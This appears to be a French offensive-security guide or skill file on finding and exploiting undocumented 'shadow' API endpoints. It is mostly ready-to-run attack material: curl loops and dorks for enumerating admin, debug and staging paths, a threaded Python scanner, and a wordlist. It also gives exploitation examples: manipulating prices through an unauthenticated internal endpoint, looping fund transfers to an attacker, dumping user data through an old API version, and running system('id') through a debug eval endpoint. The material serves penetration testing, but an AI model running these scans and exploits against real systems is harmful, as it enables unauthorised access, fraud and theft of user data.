---
name: api-shadow-endpoints
description: Guide complet de découverte et d'exploitation d'API shadow — endpoints zombies, debug backdoors, versioning attacks, swagger/OpenAPI leaks, staging endpoints, admin panels, et API docs exposées
category: cybersecurite
---

# API Shadow Endpoints — Guide Avancé

## Introduction

Les **shadow APIs** sont des endpoints non documentés, oubliés, ou dépréciés qui exposent des fonctionnalités dangereuses. Ils résultent de versions oubliées, de debug backdoors, de staging non désactivé, ou de documentation interne exposée.

## 1. Découverte Passive

### 1.1 Wayback Machine & Archives

```bash
# Historique complet des endpoints API
curl "http://web.archive.org/cdx/search/cdx?url=*.target.com/api/*&output=json&fl=original,timestamp&collapse=urlkey" \
  | jq -r '.[] | .[0]' | sort -u

# Wayback Machine diff — voir les endpoints supprimés
curl "http://web.archive.org/cdx/search/cdx?url=target.com/api/v1/admin/*&output=json&fl=original,timestamp" \
  | jq -r '.[] | "\(.[1]) \(.[0])"' | sort

# CommonCrawl — extraction d'endpoints
curl "http://index.commoncrawl.org/CC-MAIN-2024-*-index?url=*.target.com/api/*&output=json" \
  | jq -r '.url' | sort -u
```

### 1.2 JavaScript Source Analysis

```bash
# Extraire les endpoints API des fichiers JS
grep -rohP '["'\''](https?://[^"'\'']*api[^"'\'']*)["'\'']' *.js | sort -u

# Pattern: chemins API dans le JS
grep -rohP '["'\'']/[a-z]+/v[0-9]/[^"'\'']*["'\'']' *.js | sort -u

# Mobile app reverse engineering
# APK: décompiler pour trouver des endpoints cachés
apktool d app.apk
grep -r "https\?://" app/smali/ | grep -i api | sort -u

# iOS IPA
unzip app.ipa
grep -r "https\?://" Payload/ | grep -i api | sort -u
```

### 1.3 Google Dorks pour API Shadow

```text
inurl:"/api/v1/admin" site:target.com
inurl:"/api/v2" site:target.com
inurl:"/api/v3" site:target.com
inurl:"/api/debug" site:target.com
inurl:"/api/internal" site:target.com
inurl:"swagger.json" site:target.com
inurl:"openapi.json" site:target.com
inurl:"api-docs" site:target.com
inurl:"/graphql" site:target.com
inurl:"postman" site:target.com "collection"
intitle:"Swagger UI" site:target.com
```

## 2. Découverte Active

### 2.1 Version Fuzzing

```bash
# Fuzzing des versions API
for v in v1 v2 v3 v4 v5 v6 v7 v8 v9 v10 \
         latest dev staging test beta alpha \
         v1.0 v1.1 v1.2 v2.0 v2.1 v3.0 \
         2019 2020 2021 2022 2023 2024; do
  for path in api api/v1 api/v2 api/v3; do
    resp=$(curl -s -o /dev/null -w "%{http_code}" https://api.target.com/$v/$path)
    [ "$resp" != "404" ] && echo "[$resp] /$v/$path"
  done
done

# Kiterunner — bruteforce spécifique API
kr scan https://api.target.com -w /usr/share/kiterunner/routes-large.kite
```

### 2.2 Extension & Format Fuzzing

```bash
# Fuzzing des extensions d'endpoints
ffuf -w formats.txt -u https://api.target.com/api/v1/users/FUZZ

# formats.txt:
.json
.xml
.yaml
.yml
.csv
.txt
.html
.php
.asp
.jsp
.do
.action
.cfm
.svc
.ashx
.py
.rb
/test
/debug
/health
/status
/metrics
/info
/help
```

### 2.3 Header-Based Discovery

```bash
# Détection via headers de réponse
curl -s -D - https://api.target.com/api/v1/users | grep -iE '^(X-|x-|X_|x_)'

# Headers suspects:
# X-Debug: true
# X-Internal: true
# X-Admin: true
# X-Environment: staging
# X-Version: v3-internal
# X-Hidden-Endpoints: /internal/v2/admin

# Vary header avec versions cachées
curl -s -D - https://api.target.com/api/v1/users \
  -H "Accept: application/vnd.target.v2+json"
curl -s -D - https://api.target.com/api/v1/users \
  -H "Accept-version: v2"
```

## 3. Endpoints Shadow Types

### 3.1 Admin / Internal Endpoints

```bash
# Endpoints admin non documentés
# Test systématique
for path in admin internal private backend \
            dashboard console panel management \
            supervisor operator sysadmin root \
            super superuser sudo; do
  curl -s -o /dev/null -w "%{http_code} %{size_download}" \
    https://api.target.com/api/v1/$path
  echo " /api/v1/$path"
done

# Admin panels
for path in admin dashboard admin/dashboard \
            admin/panel admin/console admin/admin \
            superadmin root/panel; do
  curl -s -o /dev/null -w "%{http_code}" \
    https://target.com/$path
  echo " /$path"
done
```

### 3.2 Debug Endpoints

```bash
# Debug endpoints exposant des données sensibles
for ep in debug debug/true debug/1 \
          _debug __debug debugger debug-info \
          dev dev/test test/test \
          test-connection test-endpoint \
          health healthcheck ping status \
          info information about env \
          phpinfo.php info.php status.php \
          server-status server-info \
          profiler _profiler profiler/phpinfo \
          trace trace/1 _trace; do
  curl -s -o /dev/null -w "%{http_code}" \
    https://api.target.com/$ep
  echo " /$ep"
done
```

### 3.3 Deprecated / Old Version Endpoints

```bash
# Anciennes versions qui n'ont pas été supprimées
# V1 → V2 → V3 migration laisse souvent V1 accessible
for v in v1 v2 v3 v4 v5 v6; do
  for path in users products orders payments admin \
              login signup profile settings config; do
    code=$(curl -s -o /dev/null -w "%{http_code}" \
      https://api.target.com/api/$v/$path)
    [ "$code" != "404" ] && echo "[$code] /api/$v/$path"
  done
done

# Anciens noms de endpoints (refactoring)
for path in customers members accounts clients \
            items goods services products; do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    https://api.target.com/api/v1/$path)
  [ "$code" != "404" ] && echo "[$code] /api/v1/$path"
done
```

### 3.4 Staging / Dev Endpoints

```bash
# Sous-domaines et chemins staging
for sub in staging dev test uat qa sandbox \
           development stage preview beta \
           alpha canary integration demo; do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    --connect-timeout 3 https://$sub.target.com/api/v1/users)
  [ "$code" != "000" ] && echo "[$code] $sub.target.com"
done

# Staging sur le même domaine
for path in staging dev test sandbox \
            preprod uat qa canary; do
  curl -s -o /dev/null -w "%{http_code}" \
    https://target.com/$path/api/v1/users
  echo " /$path/api/v1/users"
done
```

## 4. Documentation Leaks

### 4.1 Swagger / OpenAPI Discovery

```bash
# Chemins courants Swagger/OpenAPI
for path in swagger.json swagger.yaml swagger.yml \
            openapi.json openapi.yaml openapi.yml \
            api-docs api-docs.json api-docs.yaml \
            v2/api-docs v3/api-docs swagger-ui.html \
            doc docs documentation api/spec \
            spec.json spec.yaml; do
  resp=$(curl -s -o /dev/null -w "%{http_code}" \
    https://api.target.com/$path)
  [ "$resp" = "200" ] && echo "[200] /$path"
done

# Swagger UI
for path in swagger-ui swagger-ui.html \
            swagger/index.html api/swagger \
            swagger-resources; do
  curl -s -o /dev/null -w "%{http_code}" \
    https://api.target.com/$path
  echo " /$path"
done
```

### 4.2 Postman Collections

```bash
# Postman collections exposées
for path in postman/collection postman_collection.json \
            collection.json postman.json \
            api/postman api/collection \
            v1/postman v2/postman; do
  curl -s -o /dev/null -w "%{http_code}" \
    https://api.target.com/$path
  echo " /$path"
done
```

### 4.3 GraphQL Introspection

```bash
# GraphQL introspection si désactivée → endpoints shadow
curl -X POST https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name fields{name args{name type{name}}}}}}"}'
# Peut révéler des mutations non documentées
```

## 5. Exploitation des Shadow APIs

### 5.1 Internal Endpoint Bypass

```bash
# Découvrir un endpoint /api/internal/calculatePrice
# Qui n'a pas d'authentification
curl https://api.target.com/api/internal/calculatePrice \
  -d '{"productId": 1, "quantity": 1, "discount": 100}'
# → Prix manipulé

# Internal sans rate limit
for i in $(seq 1 10000); do
  curl https://api.target.com/api/internal/transfer \
    -d '{"amount": 100, "to": "attacker"}'
done
```

### 5.2 Old Version Exploitation

```bash
# V1 — pas d'authentification
GET /api/v1/users → 401
# V2 — authentification implémentée
GET /api/v2/users → 200 avec auth
# V3 — authentification + rate limiting
GET /api/v3/users → 200 avec auth + rate limit

# Si V1 est toujours accessible sans auth
GET /api/v1/users → 200 (shadow endpoint !)
curl -s https://api.target.com/api/v1/users | jq '.'
# → Toutes les données utilisateurs exposées
```

### 5.3 Debug Endpoint Exploitation

```bash
# Debug endpoint qui expose la stack technique
curl https://api.target.com/_debug
→ {"env":"production","db":"mysql://...","redis":"...","aws_key":"..."}

# Debug qui permet d'exécuter du code
curl -X POST https://api.target.com/__debug/eval \
  -d '{"code":"system('id')"}'
```

## Script Automatisé

```python
#!/usr/bin/env python3
"""Scanner de shadow APIs automatisé."""
import requests
from concurrent.futures import ThreadPoolExecutor

BASE = "https://api.target.com"

VERSIONS = ["v1", "v2", "v3", "v4", "v5", "latest", "dev", "staging", "test"]
PATHS = ["users", "admin", "products", "orders", "payments",
         "login", "signup", "profile", "config", "settings",
         "debug", "internal", "private", "health", "status",
         "dashboard", "metrics", "info", "backup", "export"]

SWAGGER_PATHS = [
    "swagger.json", "openapi.json", "api-docs",
    "v2/api-docs", "swagger-ui.html"
]

def check_endpoint(url):
    try:
        r = requests.get(url, timeout=5)
        if r.status_code not in [404, 403, 000]:
            return (url, r.status_code, len(r.text))
    except:
        pass
    return None

def scan_all():
    results = []
    targets = []

    # Version + Path fuzzing
    for v in VERSIONS:
        for p in PATHS:
            targets.append(f"{BASE}/api/{v}/{p}")

    # Swagger paths
    for s in SWAGGER_PATHS:
        targets.append(f"{BASE}/{s}")

    # Parallel scan
    with ThreadPoolExecutor(max_workers=30) as ex:
        for result in ex.map(check_endpoint, targets):
            if result:
                results.append(result)

    # Affichage
    for url, code, size in sorted(results):
        print(f"[{code}] ({size}B) {url}")

if __name__ == "__main__":
    scan_all()
```

## Wordlist Endpoints Rapide

```bash
# Wordlist à combiner avec ffuf/kiterunner
cat << 'EOF' > api_shadow.txt
admin
internal
private
backend
debug
test
dev
staging
sandbox
qa
uat
canary
beta
alpha
preview
dashboard
console
panel
management
monitor
health
status
metrics
info
swagger
openapi
api-docs
explorer
graphiql
voyager
playground
docs
documentation
help
guide
tutorial
backup
export
import
migrate
migration
sync
batch
job
cron
webhook
callback
hook
notification
search
analytics
report
log
audit
config
configuration
settings
env
environment
secret
key
token
EOF
```

## Checklist

- [ ] Wayback Machine — historique des endpoints
- [ ] JS source analysis (web + mobile)
- [ ] Google Dorks API discovery
- [ ] Version fuzzing (v1→v10, dev, staging)
- [ ] Extension fuzzing (.json, .xml, .php, /debug)
- [ ] Header-based discovery (X-*, Accept-Version)
- [ ] Admin/internal endpoint scan
- [ ] Debug endpoint scan
- [ ] Old version endpoints (deprecated, non supprimés)
- [ ] Staging/dev subdomain scan
- [ ] Swagger/OpenAPI discovery
- [ ] Postman collection leaks
- [ ] GraphQL introspection
- [ ] Internal endpoint (no auth) exploitation
- [ ] Old version (no auth) exploitation
- [ ] Debug backdoor exploitation
- [ ] API key exposure dans anciens endpoints

## Ressources

- **Shadow APIs** : https://apisecurity.io/shadow-apis/
- **HackTricks API Discovery** : https://book.hacktricks.wiki/en/pentesting-web/rest-api-security/index.html
- **API Security Universe** : https://github.com/shieldfy/API-Security-101
- **Kiterunner** : https://github.com/assetnote/kiterunner